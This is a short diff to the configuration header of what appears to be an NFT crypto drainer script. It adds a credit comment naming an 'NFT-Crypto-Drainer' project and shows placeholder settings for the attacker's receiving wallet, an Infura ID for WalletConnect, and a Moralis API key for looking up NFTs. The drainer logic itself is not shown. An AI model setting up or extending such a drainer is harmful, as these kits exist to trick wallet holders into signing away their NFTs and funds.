@@ -1,3 +1,7 @@
+/* 
+    Credits: https://github.com/0x32Moon/NFT-Crypto-Drainer
+*/
+
 const address = "YOUR WALLET";    // Your wallet that you have to receive NFTs
 const infuraId = "API KEY"     // Infuria ID | https://infura.io/ | For Wallet Connect
 const moralisApi = "X-API-KEY"    // x-api-key | https://moralis.io/ | For NFTs
